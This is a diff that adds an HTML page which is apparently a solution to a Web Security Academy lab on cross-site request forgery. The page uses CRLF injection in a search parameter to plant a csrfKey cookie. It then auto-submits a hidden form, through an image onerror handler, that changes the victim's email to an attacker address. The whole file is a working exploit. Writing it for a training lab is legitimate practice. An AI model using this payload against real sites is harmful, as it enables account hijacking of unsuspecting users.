@@ -1,0 +1,10 @@
+<!-- Cookie csrfKey works as session ID here. It's app weakness. -->
+<html>
+  <body>
+    <form action="https://acd41f251facd65c80122553008d00c5.web-security-academy.net/email/change" method="POST">
+      <input required type="hidden" name="csrf" value="nwA4aBrVat0amHXA9Z6nfo8coPU8JhWK"/>
+      <input type="hidden" name="email" value="pwned@evil-user.net" />
+    </form>
+    <img src="https://acd41f251facd65c80122553008d00c5.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=kE4no0fY9JeJvK9KSGzoZrIYZ7PTubzQ" onerror="document.forms[0].submit()">
+  </body>
+</html>
